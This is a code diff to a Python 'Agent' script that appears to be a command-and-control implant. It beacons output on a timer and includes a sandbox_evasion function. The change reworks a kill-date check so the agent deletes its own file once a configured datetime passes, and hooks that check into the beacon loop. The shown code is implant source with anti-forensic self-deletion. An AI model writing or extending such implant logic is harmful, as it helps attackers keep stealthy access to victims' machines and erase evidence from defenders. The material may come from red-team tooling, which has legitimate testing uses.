@@ -240,32 +240,25 @@ def confirm_kill():
     Compares the Agent kill datetime with the current datetime and kills the Agent if time is due.
     :return:
     """
-    # TODO Invoke this method somewhere
     if VERBOSE:
         print('[+] Checking kill datetime')
     global kill_date_string
-    if kill_date_string == '':
-        check = configparser.ConfigParser()
-        check.read('config.ini')
-        if VERBOSE:
-            print('[+] Reading config.ini file')
 
-        if 'kill_date' in check['AGENT']:
-            kill_date_string = check['AGENT']['kill_date']
-
-    if kill_date_string == '':
+    if kill_date_string == 'None':
         return
 
-    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    if now > kill_date_string:
+    try:
+        kill_date = datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S')
+    except ValueError:
+        print('[+] Agent received invalid kill datetime')
+        return
+
+    now = datetime.datetime.now()
+    if now > kill_date:
         path = Path(__file__)
         os.remove(path)
 
-        if os.path.exists(path=THIS_DIR / 'config.ini'):
-            os.remove(THIS_DIR / 'config.ini')
-
-        if VERBOSE:
-            print('[+] Agent killed. RIP')
+        sys.exit('[+] Agent killed. RIP')
 
 
 def sandbox_evasion():
@@ -305,5 +298,6 @@ if __name__ == '__main__':
         while True:
             time.sleep(INTERVAL)
             send_output()
+            confirm_kill()
     except KeyboardInterrupt:
         sys.exit('[+] Agent stopped')
